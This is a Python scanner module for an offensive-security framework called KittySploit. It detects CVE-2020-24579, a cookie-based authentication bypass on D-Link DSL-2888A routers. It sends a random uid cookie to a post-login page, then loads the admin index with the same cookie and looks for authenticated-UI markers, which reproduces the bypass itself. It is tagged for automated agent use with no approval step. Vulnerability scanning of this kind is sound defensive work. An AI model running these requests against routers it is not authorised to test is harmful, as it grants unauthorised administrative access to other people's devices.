#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DSL-2888A cookie privilege escalation / auth bypass (CVE-2020-24579..)."""

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DSL-2888A - Cookie Auth Bypass Detection (CVE-2020-24579)',
        'description': (
            'Detects D-Link DSL-2888A session elevation by fetching '
            '/page/login/login_succ.html with a random uid cookie, then /index.html with the '
            'same cookie and looking for authenticated UI markers.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2020', 'dlink', 'router', 'auth-bypass',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2020-24579',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-24577',
        ],
        'cve': 'CVE-2020-24579',
    }

    def run(self):
        uid = secrets.token_hex(5)
        cookies = {'uid': uid}
        r1 = self.http_request(
            method='GET',
            path='/page/login/login_succ.html',
            cookies=cookies,
            allow_redirects=False,
        )
        if not r1 or 'top.location.href = "/index.html";' not in (r1.text or ''):
            return False
        r2 = self.http_request(
            method='GET',
            path='/index.html',
            cookies=cookies,
            allow_redirects=False,
        )
        if not r2:
            return False
        body = r2.text or ''
        markers = (
            'label id="index_Show_MacAddress">',
            'Click on the pencil icon to give the device a name',
            'gotosettings.png',
            'A new firmware is available!',
        )
        if any(m in body for m in markers):
            self.set_info(
                severity='critical',
                reason='D-Link DSL-2888A cookie auth bypass (CVE-2020-24579)',
                path='/page/login/login_succ.html',
            )
            return True
        return False
